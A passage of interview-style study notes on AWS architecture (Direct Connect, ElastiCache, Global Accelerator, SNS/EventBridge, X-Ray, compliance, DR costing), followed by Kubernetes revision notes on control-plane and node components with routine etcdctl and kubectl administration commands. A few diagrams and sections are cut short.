- Connects a DX connection to VPCs in multiple regions.
- Without DX Gateway, DX connects to one VGW in one region.
- With DX Gateway, one DX connection can reach VPCs across regions.

**Decision:**

```
| Factor           | VPN                  | Direct Connect        |
|------------------|---------------------|-----------------------|
| Bandwidth        | < 2.5 Gbps          | 1–100 Gbps            |
| Setup time       | Hours               | Weeks-months          |
| Latency          | Variable (internet) | Consistent (dedicated)|
| Cost (low vol)   | Cheaper             | Higher (port fees)    |
| Cost (high vol)  | More expensive       | Cheaper (per GB)      |
| Encryption       | Built-in (IPsec)    | Optional (MACsec/VPN) |
| Best for         | Quick start, backup | Production, heavy I/O |
```

**Multi-account:** Direct Connect can be shared across accounts via Direct Connect Gateway + TGW. VPN connections are per-VPC/TGW attachment.

**Multi-region:** DX Gateway enables multi-region access from a single DX connection. VPN is per-region (connect to TGW in each region).

**Concepts introduced:**
- **AWS Site-to-Site VPN:** Encrypted tunnel over the internet between on-premises and AWS. Quick to set up, limited bandwidth.
- **AWS Direct Connect (DX):** Dedicated private network connection between on-premises and AWS. High bandwidth, consistent latency, weeks to provision.
- **Direct Connect Gateway:** Enables a single DX connection to reach VPCs in multiple regions.

# 25. ElastiCache

---

### Q25.1: Your application makes the same database queries repeatedly, and RDS is becoming a bottleneck. How do you implement caching?

**Answer:**

**Context:** Caching reduces database load by storing frequently accessed data in memory for sub-millisecond retrieval.

**ElastiCache: Two engines**

1. **Redis:**
   - Rich data structures (strings, lists, sets, sorted sets, hashes, streams).
   - Persistence (snapshots, AOF).
   - Replication with automatic failover (cluster mode).
   - Pub/Sub messaging.
   - Lua scripting.
   - Use for: Session stores (Q8.3), leaderboards, real-time analytics, message queues, geospatial data.

2. **Memcached:**
   - Simple key-value only.
   - No persistence, no replication.
   - Multi-threaded (utilizes multiple cores).
   - Use for: Simple caching where you don't need persistence or complex data types.

**Caching patterns:**

1. **Cache-Aside (Lazy Loading):**
   ```
   App → Cache hit? → Yes → Return cached data
                    → No  → Query DB → Store in Cache → Return
   ```
   - Data loaded into cache on first request.
   - Cache misses are expensive (DB query + cache write).
   - Risk of stale data if DB is updated directly.

2. **Write-Through:**
   ```
   App → Write to Cache AND DB simultaneously
   ```
   - Cache always has latest data.
   - Every write is slower (two writes).
   - May cache data that's never read.

3. **Write-Behind (Write-Back):**
   ```
   App → Write to Cache → Cache asynchronously writes to DB
   ```
   - Fastest writes.
   - Risk of data loss if cache fails before DB write.

**TTL (Time-To-Live):** Set per key. Automatically expires data. Balances freshness vs cache hit rate.

**ElastiCache Serverless:** Auto-scales compute and memory. No node management. Pay per ECU (ElastiCache Compute Unit) and GB of stored data. Good for variable or unpredictable workloads.

**Multi-account:** ElastiCache clusters are per-account, per-VPC. Cross-account access requires network connectivity (peering/TGW) and SG rules.

**Multi-region:** ElastiCache (Redis) supports Global Datastore — cross-region replication with < 1 second lag. Read-only in secondary regions. Failover promotion available.

**Concepts introduced:**
- **ElastiCache:** Managed in-memory caching service. Redis or Memcached. Sub-millisecond latency.
- **Cache-Aside:** Application checks cache first, loads from DB on miss. Most common pattern.
- **Write-Through:** Application writes to both cache and DB. Ensures consistency.
- **TTL (Time-To-Live):** Automatic expiration of cached data after a set duration.
- **ElastiCache Global Datastore:** Cross-region Redis replication for read locality and DR.

# 26. Global Accelerator

---

### Q26.1: Your application is deployed in us-east-1 and ap-southeast-1. Users connecting from Europe and Africa experience inconsistent latency. Route 53 latency-based routing helps but isn't perfect. What else can you do?

**Answer:**

**Context:** DNS-based routing (Route 53) has limitations: DNS caching means slow failover, and it doesn't optimize the network path itself.

**AWS Global Accelerator:**

```
User (Europe) → AWS Edge Location (Frankfurt)
                    │
                    └── AWS Global Network (private backbone) ──► us-east-1 ALB
                                                               or ap-southeast-1 ALB
```

- Provides 2 static anycast IP addresses.
- Users connect to the nearest AWS edge location.
- Traffic then traverses the AWS private backbone to your endpoint — avoiding public internet routing.
- Health-check-based failover between endpoints in seconds (not DNS TTL-dependent).

**vs Route 53:**

```
| Feature              | Route 53 (Latency)     | Global Accelerator      |
|----------------------|-----------------------|------------------------|
| Static IPs           | No (DNS names)        | Yes (2 anycast IPs)    |
| Failover speed       | DNS TTL (60s+)        | Seconds                |
| Path optimization    | No (DNS only)         | Yes (AWS backbone)     |
| Protocol support     | HTTP/HTTPS (DNS-level)| TCP, UDP               |
| Cost                 | $0.50/hosted zone     | $0.025/hr + $0.01/GB   |
```

**Use cases:**
- Applications needing static IPs (firewall allowlisting).
- Real-time applications (gaming, VoIP) needing consistent low latency.
- Multi-region failover faster than DNS TTL allows.
- TCP/UDP applications (not just HTTP) needing global distribution.

**Architecture:**

```
                    Global Accelerator
                    (2 Anycast IPs)
                    /              \
           Europe users         Asia users
              │                    │
              ▼                    ▼
        Edge (Frankfurt)      Edge (Singapore)
              │                    │
         AWS Backbone         AWS Backbone
              │                    │
              ▼                    ▼
        ALB us-east-1        ALB ap-southeast-1
```

**Multi-account:** Global Accelerator is per-account. Endpoints can be ALBs, NLBs, EIPs, or EC2 instances in the same account.

**Multi-region:** This IS the multi-region use case. Global Accelerator directs traffic to the optimal regional endpoint based on health and user proximity.

**Concepts introduced:**
- **AWS Global Accelerator:** Network layer service providing static anycast IPs and AWS backbone routing to regional endpoints. Faster failover and more consistent performance than DNS-based routing.
- **Anycast IP:** A single IP address announced from multiple locations. Users are routed to the nearest location by the network.

# 27. SNS & EventBridge

---

### Q27.1: You need to fan out a single event (e.g., "order placed") to multiple consumers: email notification, inventory update, analytics pipeline. What's the best approach?

**Answer:**

**Context:** Fan-out is a messaging pattern where one event triggers multiple independent processing paths.

**SNS Fan-out:**

```
Order Service ──► SNS Topic: order-placed
                       │
              ┌────────┼────────┐
              ▼        ▼        ▼
         SQS Queue  SQS Queue  Lambda
         (Inventory) (Analytics) (Email)
```

**SNS (Simple Notification Service):**
- Pub/Sub messaging service.
- Topics: Named channels. Publishers send messages to topics. Subscribers receive messages.
- Subscribers: SQS, Lambda, HTTP/HTTPS, email, SMS, mobile push.
- Standard SNS: At-least-once delivery, no ordering.
- FIFO SNS: Ordered, exactly-once, pairs with FIFO SQS.

**SNS + SQS Fan-out pattern:**
- Each SQS queue subscribes to the SNS topic.
- Each queue has its own consumer processing at its own pace.
- If one consumer fails, the others are unaffected.
- SQS provides buffering, retry, and DLQ for each consumer.

**EventBridge (more powerful alternative):**

```
Order Service ──► EventBridge Bus: default
                       │
              Rules match events:
              ┌────────┼────────┐
              ▼        ▼        ▼
        Rule 1:     Rule 2:   Rule 3:
        source=     source=   source=
        order       order     order
        detail-type detail-type detail-type
        =placed     =placed   =placed
              │        │        │
              ▼        ▼        ▼
         SQS Queue  Lambda   Step Functions
         (Inventory) (Email)  (Analytics)
```

**EventBridge vs SNS:**

```
| Feature              | SNS                    | EventBridge              |
|----------------------|-----------------------|--------------------------|
| Filtering            | Message attributes    | JSON content-based rules |
| Targets              | SQS, Lambda, HTTP, etc| 20+ targets inc Step Fn  |
| Schema registry      | No                    | Yes                      |
| Cross-account        | Topic policies         | Cross-account bus        |
| Scheduling           | No                    | Yes (cron/rate)          |
| Archive & Replay     | No                    | Yes                      |
| 3rd party integration| No                    | Yes (SaaS events)        |
```

**Decision:** Use EventBridge for event-driven architectures with complex routing, filtering, or scheduling. Use SNS for simple pub/sub with existing SQS consumers.

**Multi-account:** SNS topics can have cross-account subscriptions. EventBridge supports cross-account event buses — events can be forwarded to another account's bus.

**Multi-region:** Both are regional. For cross-region event routing, EventBridge supports cross-region forwarding via rules that target another region's event bus.

**Concepts introduced:**
- **SNS (Simple Notification Service):** Pub/Sub messaging. Topics with subscribers. Supports SQS, Lambda, HTTP, email, SMS.
- **Amazon EventBridge:** Serverless event bus. JSON content-based filtering, scheduling, archive/replay, 20+ targets. More powerful than SNS for event-driven architectures.
- **Fan-out Pattern:** One event triggers multiple independent consumers. Typically SNS → multiple SQS queues.

# 28. X-Ray — Distributed Tracing

---

### Q28.1: Your microservices application has intermittent latency spikes. CloudWatch metrics show each service individually is fine, but end-to-end request latency is high. How do you diagnose this?

**Answer:**

**Context:** In microservices, a single user request may traverse 5-10 services. The bottleneck may be in any service, in the communication between services, or in a downstream dependency. CloudWatch per-service metrics can't show the full picture.

**AWS X-Ray:**

```
Client Request → API Gateway → Lambda → DynamoDB
                    │
                    └──► S3
                    │
                    └──► SQS → Lambda → RDS
```

X-Ray traces the request across all these services, creating a **Service Map** and **Trace Timeline**.

**Components:**
1. **Trace:** A full request path through the system. Identified by a trace ID in the HTTP header (`X-Amzn-Trace-Id`).
2. **Segment:** Each service's contribution to the trace. Includes timing, errors, and metadata.
3. **Subsegment:** Breakdown within a segment (e.g., a database call within a Lambda function).

**How it works:**
- Instrument your application with the X-Ray SDK (or enable tracing on AWS services like API Gateway, Lambda, ALB).
- The SDK sends trace data to the X-Ray daemon (UDP on port 2000), which batches and sends to X-Ray.
- X-Ray assembles the traces and provides:
  - **Service Map:** Visual graph of services and their connections, with latency and error rates on each edge.
  - **Trace Timeline:** Waterfall view of a single request — shows exactly which service or call was slow.
  - **Analytics:** Filter traces by latency, error rate, specific annotations.

**Identifying the bottleneck:**

```
Trace Timeline:
├── API Gateway (5ms)
├── Lambda-Auth (15ms)
├── Lambda-OrderService (1200ms)    ← Slow!
│   ├── DynamoDB GetItem (5ms)
│   ├── External API call (1100ms)  ← Root cause!
│   └── S3 PutObject (20ms)
└── Total: 1250ms
```

The trace shows that the OrderService Lambda is slow because of an external API call taking 1100ms. Individual CloudWatch metrics for each Lambda would show fast execution — the delay is in the external dependency.

**X-Ray Groups and Insights:**
- **Groups:** Filter traces by expression (e.g., `service("OrderService") AND responsetime > 1000`).
- **Insights:** Automated anomaly detection on trace data. X-Ray alerts you when a service's latency or error rate deviates from baseline.

**Multi-account:** X-Ray supports cross-account tracing — traces propagate across account boundaries when services call each other. Configure X-Ray to send segments to a monitoring account.

**Multi-region:** Traces can span regions (e.g., a service in us-east-1 calls a service in eu-west-1). The trace ID propagates via HTTP headers.

**Concepts introduced:**
- **AWS X-Ray:** Distributed tracing service for analyzing and debugging microservices applications. Provides service maps, trace timelines, and automated anomaly detection.
- **Trace:** The complete record of a request's journey through multiple services. Contains segments and subsegments.
- **Service Map:** Visual representation of services and their interconnections, annotated with latency and error rates.

**99.99% Availability Design Decisions:**
- Multi-AZ everything (ALB, Aurora, ElastiCache, NAT GW).
- Multi-region (Aurora Global Database, S3 CRR, Global Accelerator failover).
- Auto-scaling at every layer (ECS Service Auto Scaling, Aurora readers, ElastiCache).
- Health checks at every boundary (Route 53, ALB, ECS).
- Circuit breakers in application code (prevent cascade failures).
- No single points of failure.

**10,000 req/s Design Decisions:**
- CloudFront offloads static content (95%+ cache hit rate reduces origin load).
- ElastiCache absorbs repeated database reads.
- ALB handles connection management and routing.
- ECS Fargate auto-scales based on CPU/memory or custom metrics.
- SQS decouples synchronous from asynchronous processing.
- Aurora Reader endpoints handle read-heavy queries.

**Security Design Decisions:**
- WAF at CloudFront edge (SQL injection, rate limiting).
- Shield Advanced on CloudFront, ALB (DDoS).
- All data encrypted at rest (KMS CMK) and in transit (TLS).
- IAM roles for all services (no long-lived credentials).
- Secrets Manager for credential rotation.
- VPC private subnets for compute, isolated subnets for databases.
- GuardDuty + Security Hub for threat detection.
- SCPs for organizational guardrails.

This architecture represents the synthesis of every concept covered in this guide.

### Q29.2: You deploy a new version of your application and the error rate jumps from 0.1% to 15%. How do you handle this incident and what should the automated response look like?

**Answer:**

**Context:** A deployment-triggered incident requires fast detection, automated response, and structured rollback.

**Detection (automated):**

```
CloudWatch Composite Alarm:
  Condition: Error rate > 5% AND P99 latency > 2s (for 2 consecutive 1-min periods)
       │
       ▼
SNS Topic → PagerDuty (alert on-call engineer)
             → Lambda (automated response)
```

**Automated Response Lambda:**

```
1. Trigger CodeDeploy/ECS Rollback
   └── Revert to last known good task definition or deployment group

2. If rollback not automated:
   └── Scale up ASG (add capacity to handle errors with retries)
   └── Enable circuit breaker (return cached/degraded response)

3. Notify:
   └── Slack: "#incidents: Deployment rollback triggered for order-service"
   └── Create PagerDuty incident
```

**Deployment strategies that prevent this:**

1. **Canary deployment:** Route 5% of traffic to the new version. Monitor for 10 minutes. If healthy, proceed to full rollout. If errors spike, rollback only the canary.

2. **Blue-Green deployment:** Deploy new version alongside old. Shift traffic all-at-once. Rollback = switch traffic back.

3. **Rolling deployment:** Replace instances/tasks one-at-a-time. If any new instance fails health checks, stop the rollout.

**ECS Deployment Configuration:**

```
ECS Service:
  Deployment Controller: CODE_DEPLOY (for blue/green)
  Deployment Circuit Breaker: Enabled
    → Auto-rollback if new tasks fail health checks
  Minimum Healthy Percent: 100
  Maximum Percent: 200
    → New tasks launch before old ones drain
```

**Post-incident:**
- Blameless postmortem.
- Update runbooks.
- Add missing alerts or monitors.
- Improve deployment pipeline (add integration tests, canary analysis).

**Multi-account:** CI/CD pipelines in a dedicated account deploy cross-account using IAM roles (Q2.2). Rollback targets are per-account.

**Multi-region:** Deploy region-by-region. If errors spike in the first region, halt deployment to other regions. Route 53 can shift traffic away from the affected region during investigation.

### Q29.3: You receive a compliance requirement that all data at rest must be encrypted, all API calls must be logged, and all network traffic must be logged. How do you audit and enforce this across your Organization?

**Answer:**

**Context:** Compliance enforcement at scale requires automated detection, preventive controls, and detective controls.

**Preventive Controls (prevent non-compliance):**

1. **SCPs (Q2.3):**
   - Deny `ec2:CreateVolume` without encryption.
   - Deny `s3:CreateBucket` without default encryption.
   - Deny `rds:CreateDBInstance` without `StorageEncrypted=true`.

2. **Account defaults:**
   - Enable default EBS encryption in every account/region.
   - Enable S3 Block Public Access at account level.

3. **IAM Policies:**
   - Deny `ec2:RunInstances` unless IMDSv2 is required.

**Detective Controls (detect non-compliance):**

1. **AWS Config:**
   - Managed rules that continuously evaluate resource compliance:
     - `encrypted-volumes`: All EBS volumes must be encrypted.
     - `s3-bucket-server-side-encryption-enabled`: All S3 buckets must have default encryption.
     - `rds-storage-encrypted`: All RDS instances must be encrypted.
     - `cloud-trail-enabled`: CloudTrail must be enabled.
     - `vpc-flow-logs-enabled`: VPC Flow Logs must be enabled.
   - Non-compliant resources appear in Config dashboard.
   - Auto-remediation: Config rule triggers SSM Automation or Lambda to fix.

2. **CloudTrail Organization Trail:** All API calls across all accounts logged to central S3 bucket (Q20.1).

3. **VPC Flow Logs (Q1.7):** Enable at VPC level in all accounts.

4. **Security Hub (Q22.1):** Run CIS Benchmarks and AWS Foundational Best Practices checks.

**Enforcement Architecture:**

```
AWS Organization
       │
       ├── SCPs (preventive)
       │     Deny unencrypted resource creation
       │
       ├── AWS Config (detective)
       │     Managed rules check compliance
       │     Auto-remediation via Lambda/SSM
       │
       ├── CloudTrail Organization Trail
       │     All API calls → S3 (Object Lock) in Log Archive Account
       │
       ├── VPC Flow Logs (all accounts)
       │     Network traffic metadata → S3 in Log Archive Account
       │
       └── Security Hub (aggregated compliance dashboard)
             Findings from Config + GuardDuty + Inspector + Macie
```

**Multi-account:** All these controls operate at the Organization level via delegated administrators. Config Aggregator collects compliance data across all accounts. Security Hub aggregates findings.

**Multi-region:** Config rules, CloudTrail, and VPC Flow Logs must be enabled in each region. Config Aggregator and Security Hub support cross-region aggregation.

---

### Q29.4: Your CFO asks you to justify multi-region architecture costs. Currently spending $50K/month in one region. Estimate the cost increase and make the case.

**Answer:**

**Context:** Multi-region isn't free. The business case depends on the cost of downtime vs the cost of DR infrastructure.

**Cost estimation by DR strategy:**

```
Current: $50K/month (single region)

| Strategy        | Additional Cost  | Total    | RTO         | RPO        |
|-----------------|-----------------|----------|-------------|------------|
| Backup/Restore  | ~$2-5K (5-10%)  | ~$52-55K | Hours       | Hours      |
| Pilot Light     | ~$5-10K (10-20%)| ~$55-60K | 15-30 min   | Minutes    |
| Warm Standby    | ~$15-25K (30-50%)| ~$65-75K| 5-10 min    | Seconds    |
| Active-Active   | ~$40-50K (80-100%)| ~$90-100K| Near-zero  | Near-zero  |
```

**Cost breakdown for Pilot Light ($5-10K additional):**
- Aurora cross-region replica: ~$3-5K/month (depends on instance size).
- S3 CRR: ~$0.02/GB data transfer + storage.
- EBS snapshot cross-region copies: Minimal (storage only).
- Infrastructure (dormant): TGW attachments, VPC endpoints = ~$500/month.
- No compute running = biggest savings vs warm standby.

**Justification framework:**
- Calculate cost of downtime: If the business loses $X per minute of downtime, and a regional outage lasts 4 hours average, the exposure is $X * 240.
- If $X * 240 > the annual cost of DR, multi-region pays for itself.
- Also factor in: customer SLAs, regulatory requirements, competitive pressure, brand reputation.

**Cost optimization for multi-region:**
- Use Aurora Serverless v2 for the DR replica — scales to near-zero when idle.
- Use S3 Standard-IA for replicated data (lower storage cost).
- Keep compute in DR as ASG with min=0 and launch template ready.
- Use Spot Instances for non-critical DR workloads.

# Kubernetes — Structured Interview & Revision Notes (AWS EKS Aligned)

---

# 1. ARCHITECTURE

---

## 1.1 What is Kubernetes

### Concept

Kubernetes is a **container orchestration platform** that automates deployment, scaling, and management of containerized applications across a cluster of machines. It acts as an operating system for your datacenter — Linux manages processes on one machine; Kubernetes manages containers across many.

### Why It Is Used

Docker alone manages containers on a **single host**. At scale (hundreds of containers across dozens of servers), you need automated solutions for scheduling, self-healing, service discovery, rolling updates, and resource management. Kubernetes solves all of these declaratively.

### How It Works

Kubernetes is built on two core design principles:

**Declarative State Management** — You describe *what* you want (e.g., `replicas: 3`), and Kubernetes continuously reconciles reality to match your declaration.

```bash
# Imperative (Docker/shell):
docker run app
docker run app
docker run app   # you do the work manually

# Declarative (Kubernetes):
replicas: 3   # K8s figures out how to make it so, and KEEPS it so
```

**Control Loop / Reconciliation** — Every controller in the system runs an infinite loop:

```
Observe current state → Compare to desired state → Act to close the gap
         ↑___________________________________________________|
```

This loop runs continuously, forever. It is why Kubernetes is self-healing.

### Important Details

- Kubernetes originated from Google's internal system **Borg**, which managed billions of containers weekly. Open-sourced in 2014 and governed by the **CNCF**.
- Kubernetes is **NOT a PaaS**. It does not manage your code, CI/CD, or application logic — it manages infrastructure for containers. You build the platform on top of it.
- **Kubernetes vs Docker Compose:** Docker Compose manages multi-container apps on a single machine. Kubernetes orchestrates across many machines with self-healing, auto-scaling, and production networking.

### Interview Insights

💡 **Short answer:** "Kubernetes is a container orchestration system that automates deployment, scaling, and management of containerized apps across a cluster. It exists because Docker alone only manages one host — at scale you need scheduling, self-healing, service discovery, rolling updates, and resource management. Kubernetes solves all of that declaratively."

💡 **Deep answer:** "Beyond orchestration, Kubernetes embodies declarative state management and the control loop pattern. Every controller runs an observe-diff-act loop, which is why it's self-healing. Every resource is an API object with a spec (desired) and status (actual), and controllers close the gap between them."

## 1.2 Architecture Overview

### Concept

A Kubernetes cluster has two planes:

- **Control Plane** — the brain. Makes all decisions. Stores all state.
- **Data Plane (Worker Nodes)** — the muscle. Runs your actual workloads.

### Control Plane Components

| Component | Role |
|---|---|
| **kube-apiserver** | Front door. All requests go through here. Validates, authenticates, persists to etcd |
| **etcd** | Distributed KV store. Single source of truth for ALL cluster state |
| **kube-scheduler** | Watches for unscheduled Pods, picks the best node for each |
| **kube-controller-manager** | Runs all built-in control loops (Node, Deployment, ReplicaSet, etc.) |
| **cloud-controller-manager** | Talks to cloud provider API (AWS) for nodes, LBs, storage |

### Worker Node Components

| Component | Role |
|---|---|
| **kubelet** | Agent on every node. Ensures containers described in PodSpec are running |
| **kube-proxy** | Manages iptables/IPVS rules for Service networking on each node |
| **container runtime** | Actually runs containers — containerd (EKS default). Docker removed in K8s 1.24+ |

### AWS EKS Alignment

In **AWS EKS**, the control plane is **fully managed by AWS**. You never see or manage the API server, etcd, scheduler, or controller manager nodes. AWS runs them across multiple AZs for HA. You only manage worker nodes (managed node groups, self-managed, or Fargate).

### Interview Insights

💡 **What happens if the control plane goes down?** Running workloads continue — kubelet keeps containers alive. But you cannot schedule new pods, scale deployments, or make any API changes until the control plane recovers. This is why HA control planes are critical.

💡 **Single most important architectural rule?** Only the API server talks to etcd. All other components communicate through the API server, centralizing authentication, authorization, and admission control.

---

## 1.3 API Server

### Concept

The API server is the **single front door** to the entire Kubernetes cluster. Every action — creating a pod, scaling a deployment, checking node status — goes through it. Nothing communicates directly with anything else.

### Why It Is Used

Without a central gateway, every component would need to know where every other component is, implement its own auth, and handle its own consistency. The API server centralizes authentication, authorization, admission, validation, persistence, and the watch API.

### How It Works — The Request Pipeline

```

│     • Controller sees updated deployment spec               │
│     • Kubelet sees pod assigned to its node                 │
└─────────────────────────────────────────────────────────────┘
```

### Important Details

- The API server is **stateless** — all state lives in etcd. You can run multiple instances behind a load balancer for HA.
- The API server **does not push work to kubelets**. Kubelets **watch** the API server for pods assigned to their node. This is a **pull model, not push**.
- API Groups organize the API: `/api/v1` (Pods, Services), `/apis/apps/v1` (Deployments), `/apis/batch/v1` (Jobs), `/apis/networking.k8s.io/v1` (NetworkPolicies, Ingress).

```bash
# See exactly what kubectl sends to the API server
kubectl get pods -v=8    # verbosity level 8 — shows full HTTP request/response
```

### Interview Insights

💡 **What happens when the API server is unavailable?** Running pods continue. But nothing new can be scheduled, no deployments updated, and kubectl commands fail. Controllers stop reconciling. The cluster is in a frozen state operationally.

💡 **How does kubectl authenticate?** By default via client certificate in kubeconfig. The certificate's Common Name becomes the username, the Organization field maps to groups. Service accounts use JWT bearer tokens. OIDC integrates with external identity providers like AWS IAM.

---

## 1.4 etcd — The Source of Truth

### Concept

etcd is a **distributed key-value store** that holds the entire state of your Kubernetes cluster. Every object — every pod spec, every service, every secret, every node status — lives in etcd. If you lose etcd without a backup, your cluster state is gone permanently.

### Why It Is Used

Kubernetes needs state storage that is consistent (all readers see same data), highly available (survives node failures), strongly ordered (writes applied in deterministic sequence), and watchable (clients can subscribe to changes). etcd provides all of these via the Raft consensus algorithm.

### How It Works

```
═══════════════════════════════════════════════════════════════
etcd IN KUBERNETES
═══════════════════════════════════════════════════════════════

WHAT'S STORED:
  Resource Type         Key in etcd
  ─────────────────     ──────────────────────────────────────
  Pod specs             /registry/pods/default/mypod
  Deployment specs      /registry/deployments/default/myapp
  Node registrations    /registry/minions/node1
  Secrets (encrypted)   /registry/secrets/default/mysecret
  ConfigMaps            /registry/configmaps/default/myconfig
  Lease objects         /registry/leases/kube-system/kube-scheduler

CLUSTER TOPOLOGY — always odd number of nodes:
  ┌──────────┐    ┌──────────┐    ┌──────────┐
  │  etcd-1  │◄──►│  etcd-2  │◄──►│  etcd-3  │
  │ (LEADER) │    │(FOLLOWER)│    │(FOLLOWER)│
  └──────────┘    └──────────┘    └──────────┘

  All WRITES go to the LEADER
  Quorum required: (n/2)+1 nodes must be alive
  3-node cluster → tolerates 1 failure
  5-node cluster → tolerates 2 failures
  4-node cluster → same tolerance as 3-node (wasteful — always use odd)
```

### Critical etcd Operations

```bash
# Check etcd cluster health
etcdctl endpoint health \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key

# Take a snapshot backup — CRITICAL for disaster recovery
etcdctl snapshot save /backup/etcd-snapshot-$(date +%Y%m%d).db

# Verify backup integrity
etcdctl snapshot status /backup/etcd-snapshot.db --write-out=table

# Restore from snapshot (when quorum lost)
etcdctl snapshot restore /backup/etcd-snapshot.db \
  --data-dir=/var/lib/etcd-restore

# Compact old revisions (prevents unbounded growth)
etcdctl compact $(etcdctl endpoint status \
  --write-out="json" | jq '.[0].Status.header.revision')

# Defrag after compaction (physically reclaims disk space)
etcdctl defrag --endpoints=https://127.0.0.1:2379
```

### Best Practices

🔧 Run etcd on dedicated SSDs (p99 fsync < 10ms required). Never share disk with app workloads.
🔧 Backup daily minimum with `etcdctl snapshot save`.
🔧 Monitor db size — default quota is 2GB. Alert at 70%. When quota hit, etcd goes read-only (P0 incident).
🔧 Compact every 5 minutes (kube-apiserver default). Defrag weekly or when in_use is much less than total_size.

### AWS EKS Alignment

In EKS, **etcd is fully managed by AWS**. You do not operate, backup, or monitor etcd directly. AWS handles replication, snapshots, and maintenance. However, understanding etcd is critical for interviews and for troubleshooting self-managed clusters.

### Interview Insights

💡 **How do you back up and restore etcd?** Backup with `etcdctl snapshot save`. Restore with `etcdctl snapshot restore`, then update the etcd pod manifest to point to the restored data directory.

💡 **Why always odd number of nodes?** Because of quorum — (n/2)+1. A 4-node cluster needs 3 alive, same as 3-node. The extra node adds cost with no additional fault tolerance.

💡 **What happens if etcd loses quorum?** It goes read-only. API server can still serve reads from its watch cache but cannot persist writes. The cluster is frozen until quorum is restored.

## 1.5 Scheduler — How Pods Get Placed

### Concept

The scheduler watches for newly created Pods with no node assigned (`spec.nodeName = ""`) and picks the best node for each one. Its job is optimal placement considering resources, topology, affinity rules, and policies.

### How It Works — The Scheduling Pipeline

### Interview Insights

💡 **Why is a pod stuck in Pending?** Either: no node has enough resources (check `kubectl describe pod` → Events for FailedScheduling), no node matches nodeSelector/affinity, all nodes are tainted without tolerations, or the PVC is in a different AZ than available nodes.

## 1.6 Controller Manager — The Reconciliation Engine

### Concept

The kube-controller-manager runs all built-in **controllers** — specialized control loops that each watch a specific resource type and reconcile actual state to desired state. It is the component that makes the declarative model work.

### How It Works

```
CONTROLLER MANAGER = collection of independent controllers:

┌──────────────────────────────────────────────────────┐
│  Deployment Controller                                │
│  → Watches Deployments, creates/manages ReplicaSets   │
│                                                       │
│  ReplicaSet Controller                                │
│  → Watches ReplicaSets, maintains desired pod count   │
│                                                       │
│  Node Controller                                      │
│  → Monitors node health, marks NotReady after timeout │
│  → Evicts pods from unhealthy nodes (300s default)    │
│                                                       │
│  Job Controller                                       │
│  → Ensures Jobs run to completion                     │
│                                                       │
│  ServiceAccount Controller                            │
│  → Creates default ServiceAccount in new namespaces   │
│                                                       │
│  EndpointSlice Controller                             │
│  → Populates EndpointSlices from pods matching        │
│    Service selectors                                  │
│                                                       │
│  Namespace Controller                                 │
│  → Cleans up resources when namespace is deleted      │
│                                                       │
│  PV/PVC Controller                                    │
│  → Binds PVCs to PVs, handles dynamic provisioning   │
│                                                       │
│  ... and many more                                    │
└──────────────────────────────────────────────────────┘

Each controller:
  1. Watches its resource type via Informer (LIST + WATCH)
  2. Reads current state from local cache
  3. Compares to desired state (spec)
  4. Takes action to close the gap
  5. Updates status
```

### Important Details

- Only **one instance is active** at a time (uses leader election via Lease objects in etcd). Standby instances are ready to take over.
- Controllers are loosely coupled — the Deployment controller only manages ReplicaSets, the RS controller only manages Pods. Each layer handles one concern.
- The node controller marks a node `NotReady` after 40 seconds of missed heartbeats (default `node-monitor-grace-period`). After 300 seconds of `NotReady`, pods are evicted.

### Interview Insights

💡 **What is the reconciliation loop?** Every controller constantly observes current state, compares to desired state in the spec, and takes corrective action. This runs forever, which is why Kubernetes self-heals.

## 1.7 Kubelet — The Node Agent

### Concept

The kubelet is the **agent running on every node** that makes PodSpecs into running containers. It is the bridge between the Kubernetes control plane and the actual container runtime on the node.

### How It Works

```
═══════════════════════════════════════════════════════════════
KUBELET RESPONSIBILITIES
═══════════════════════════════════════════════════════════════

  INPUTS:
  • Watches API Server for pods assigned to THIS node
  • Static pod manifests from /etc/kubernetes/manifests/

  CORE ACTIONS:
  1. Calls Container Runtime via CRI to start/stop containers
  2. Manages pod volumes — mounts and unmounts
  3. Runs liveness, readiness, and startup probes
  4. Reports pod status back to API server
  5. Reports node status (CPU/mem available) to API server
  6. Enforces resource limits via Linux cgroups
  7. Manages pod logs (writes to /var/log/pods/)
  8. Evicts pods under node resource pressure

  DOES NOT:
  ✗ Manage containers not created by Kubernetes
  ✗ Talk to etcd directly
  ✗ Talk to other kubelets directly
```

### Static Pods

Control plane components (API server, etcd, scheduler, controller-manager) run as **static pods** — their manifests live in `/etc/kubernetes/manifests/` on the control plane node. The kubelet reads these files directly without the API server. This is how Kubernetes bootstraps itself.

```bash
# Check kubelet status on a node
systemctl status kubelet

# View kubelet logs
journalctl -u kubelet -f

# View kubelet configuration
cat /var/lib/kubelet/config.yaml
```

### Important Details

- **Kubelet does not restart itself** — if it crashes, systemd restarts it. It's the only K8s component that runs outside of Kubernetes.
- **Node allocatable vs capacity** — kubelet reserves resources for the OS and itself. Allocatable is always less than total capacity.
- **Probe failures:** Liveness failure → container restart. Readiness failure → pod removed from Service endpoints (traffic stops). Startup probe disables liveness/readiness until it passes.

### Interview Insights

💡 **How does kubelet know which pods to run?** It watches the API server for pod objects where `spec.nodeName` matches its node name via a long-lived HTTP watch connection.

---

## 1.8 kube-proxy — Networking on Nodes

### Concept

Kube-proxy runs on every node and **implements Kubernetes Service networking**. When you create a Service with a ClusterIP, kube-proxy programs the Linux kernel's packet routing to make traffic to that virtual IP actually reach your pods.

### How It Works — Two Main Modes

```
═══════════════════════════════════════════════════════════════
KUBE-PROXY MODES
═══════════════════════════════════════════════════════════════

MODE 1: iptables (default mode)
  Programs iptables rules in the kernel.
  Uses probabilistic load balancing (random selection).
  Performance: O(n) — rule lookup traverses ALL rules.
  At 10,000 services: tens of thousands of rules per packet.

MODE 2: IPVS (recommended for large clusters, 1000+ services)
  Uses Linux kernel's IPVS module with hash tables → O(1) lookup.
  Supports real LB algorithms: round-robin, least connections,
  source hash (session affinity), weighted round-robin.

MODE 3: eBPF via Cilium (replaces kube-proxy entirely)
  No iptables. No IPVS. eBPF programs in kernel do everything.
  Best performance. Increasingly common in production.
```

### Important Details

⚠️ kube-proxy does NOT handle pod-to-pod traffic — only Service-based traffic. Direct pod IP communication is handled by the CNI plugin.

### Interview Insights

💡 **ClusterIP vs NodePort vs LoadBalancer:** ClusterIP is virtual IP only within cluster. NodePort exposes static port on every node's IP. LoadBalancer provisions cloud LB (via cloud-controller-manager) in front of NodePort.

